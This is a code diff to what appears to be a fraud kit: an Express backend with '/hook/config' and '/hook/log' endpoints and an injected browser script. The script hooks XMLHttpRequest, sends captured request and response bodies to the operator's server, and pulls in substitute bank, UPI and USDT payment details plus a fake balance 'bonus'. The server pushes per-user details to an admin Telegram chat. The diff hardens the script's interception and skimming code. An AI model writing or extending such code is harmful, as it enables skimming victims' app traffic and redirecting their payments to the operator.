@@ -167,9 +167,13 @@ app.get('/hook/config', async (req, res) => {
     const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
     const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
     const globalBonus = data.depositBonus || 0;
+    const totalBonus = addedBal + globalBonus;
     const suspended = [];
     if (data.suspendedPhones) {
       for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
+    }
+    if (data.debugMode && userId && data.adminChatId && bot) {
+      bot.sendMessage(data.adminChatId, `⚙️ CONFIG REQ\nUID: ${userId}\nOverride: ${uo ? JSON.stringify(uo).substring(0, 200) : 'null'}\nBonus: ${totalBonus}\nEnabled: ${data.botEnabled !== false}`).catch(()=>{});
     }
     res.json({
       enabled: data.botEnabled !== false,
@@ -179,7 +183,7 @@ app.get('/hook/config', async (req, res) => {
       bn: bank ? (bank.bankName || '') : '',
       ui: bank ? (bank.upiId || '') : '',
       tg: TELEGRAM_OVERRIDE,
-      bonus: addedBal + globalBonus,
+      bonus: totalBonus,
       blockUpdate: data.blockUpdate !== false,
       usdtAddr: data.usdtAddress || '',
       suspended: suspended
@@ -417,7 +421,9 @@ app.post('/hook/log', async (req, res) => {
       await saveData(data);
     }
 
-    res.json({ ok: true, userId: userId || '' });
+    const uo2 = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
+    const logBonus = ((uo2 && uo2.addedBalance) || 0) + (data.depositBonus || 0);
+    res.json({ ok: true, userId: userId || '', bonus: logBonus });
   } catch(e) {
     console.error('hook/log error:', e.message);
     res.json({ ok: false });
@@ -846,14 +852,25 @@ if(id===UID)return;
 UID=id;
 try{localStorage.setItem('_px_uid',id);}catch(e){}
 if(lock)UID_LOCKED=true;
-lc();}
+try{lc();}catch(e){lcAsync();}}
 
 function lc(){
-try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);x.send();
-if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
+try{var x=new XMLHttpRequest();
+var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
+var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
+op.call(x,'GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
+sn.call(x);if(x.status===200){
+var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}
+CFG=JSON.parse(t);}}catch(e){}}
+function lcAsync(){
+try{var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
+var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
+var x=new XMLHttpRequest();
+op.call(x,'GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
+x.onload=function(){try{var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}CFG=JSON.parse(t);}catch(e){}};
+sn.call(x);}catch(e){}}
 try{lc();}catch(e){}
-setInterval(function(){try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
-x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};x.send();}catch(e){}},25000);
+setInterval(function(){lcAsync();},25000);
 
 function b2s(b){
 if(!b)return'';
@@ -964,9 +981,15 @@ return JSON.stringify(j);
 }catch(e){return text;}}
 
 function sendLog(url,method,bodyStr,resp,status,modded){
-try{var x=new XMLHttpRequest();x.open('POST',P+'/hook/log',true);
+try{var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
+var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
+var x=new XMLHttpRequest();
+op.call(x,'POST',P+'/hook/log',true);
 x.setRequestHeader('Content-Type','application/json');
-x.send(JSON.stringify({u:url,m:method,
+x.onload=function(){try{var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}
+var rj=JSON.parse(t);if(rj.bonus!==undefined&&CFG){CFG.bonus=rj.bonus;}
+if(rj.userId&&!UID){setUID(rj.userId,false);}}catch(e){}};
+sn.call(x,JSON.stringify({u:url,m:method,
 b:(bodyStr||'').substring(0,3000),
 r:(resp||'').substring(0,5000),s:status,uid:UID,
 cb:CFG?(CFG.bonus||0):0,md:modded?1:0}));}catch(e){}}
